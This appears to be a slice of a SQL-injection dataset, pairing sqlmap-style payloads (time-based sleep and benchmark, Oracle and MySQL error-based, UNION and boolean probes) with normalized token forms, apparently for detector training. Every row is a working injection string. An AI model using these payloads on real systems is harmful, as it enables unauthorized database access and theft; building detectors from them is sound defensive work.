id|payload_norm
"4062"|"1%' ) ) ) and make_set ( 1543 = 5817,5817 ) and ( ( ( '%' = '","__INT__ % __STR__ % __STR__","","","0.0"
"4063"|"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'ajka\' = \'ajka""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"4064"|"1 ) ) as rcbz where 4563 = 4563 and 2006 = 2006","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__","","","0.0"
"4065"|"select * from users WHERE username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-7184 ) as fshx where 3408 = 3408 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __IDENT__ = __STR__","","","0.0"
"4066"|"select * from users WHERE username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 ) and ( 3530 = 3530""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) and ( __INT__ = __INT__","","","0.0"
"4067"|"1%"" union all select null,null--","__INT__ % "" union all select null , null - -","","","0.0"
"4068"|"select * from users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1\' ) ) and ( ( \'ajka\' = \'ajka""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"4069"|"1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno )","__INT__ and ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ )","","","0.0"
"4070"|"-3501' ) ) ) or make_set ( 7122 = 6158,6158 ) and ( ( ( 'mlfl' like 'mlfl","- __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"4071"|"select * from users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # sipo"" or username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'nzap\' like \'nzap""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"4072"|"select * from users WHERE username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ = __STR__","","","0.0"
"4073"|"1'+ ( select rhlb where 9477 = 9477","__INT__ + ( select __IDENT__ where __INT__ = __INT__","","","0.0"
"4074"|"select * from users WHERE username = ""-9295 ) ) ) or username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""-1254"" or username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"4075"|"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 6723 = 6723""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ) or __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) and ( ( ( __INT__ = __INT__","","","0.0"
"4076"|"select * from users WHERE username = ""-2783%\' ) ) and ( ( \'%\' = \'"" or username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"4077"|"1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #","__INT__ % ' ) ) and __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) ) #","","","0.0"
"4078"|"select * from users WHERE username = ""-6665\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'winx\' = \'winx"" or username = ""1\'|| ( select \'hlxd\' from dual where 2615 = 2615 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ||\'""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"4079"|"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #","__INT__ ) or benchmark ( __INT__ , md5 ( __INT__ ) ) #","","","0.0"
"4080"|"1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and '%' = '","__INT__ % __STR__ % __STR__","","","0.0"
"4081"|"1'|| ( select 'yuku' where 7480 = 7480","__INT__ __STR__ __IDENT__ where __INT__ = __INT__","","","0.0"
"4082"|"-7469 ) where 5875 = 5875 or make_set ( 9354 = 9354,7185 ) --","- __INT__ ) where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -","","","0.0"
"4083"|"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' ) )","select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) )","","","0.0"
"4084"|"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'xzlx' like 'xzlx","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"4085"|"select * from users WHERE username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-6353%\' ) ) and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"4086"|"select * from users WHERE username = ""-4610\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\'|| ( select \'adiv\' from dual where 9842 = 9842 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"4087"|"1' ) where 6842 = 6842","__INT__ ) where __INT__ = __INT__","","","0.0"
"4088"|"1"" ) where 9499 = 9499","__INT__ ) where __INT__ = __INT__","","","0.0"
"4089"|"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-1190\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and ( ( ( __INT__ = __INT__","","","0.0"
"4090"|"1%' union all select null,null#","__INT__ % ' union all select null , null","","","0.0"
"4091"|"select * from users WHERE username = ""1\' and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) ""","","","0.0"
"4092"|"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" or username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-5863""","select * from __IDENT__ where __IDENT__ = __STR__ and __STR__ = __STR__ or __IDENT__ = __STR__ - __INT__","","","0.0"
"4093"|"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ - -","","","0.0"
"4094"|"1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --","__INT__ ) where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -","","","0.0"
"4095"|"1%' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( '%' = '","__INT__ % __STR__ % __STR__","","","0.0"
"4096"|"select * from users WHERE username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-9505\' ) ) )","select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) )","","","0.0"
"4097"|"end and ( ( ( 'ycte' = 'ycte","end and ( ( ( __STR__ = __IDENT__","","","0.0"
"4098"|"1, ( select ( case when ( 5726 = 5275 ) then 1 else 1/ ( select 0 ) end ) )","__INT__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ / ( select __INT__ ) end ) )","","","0.0"
"4099"|"1'|| ( select 'bqhi' from dual where 7409 = 7409","__INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__","","","0.0"
"4100"|"select * from users WHERE username = ""-1254"" or username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )","","","0.0"
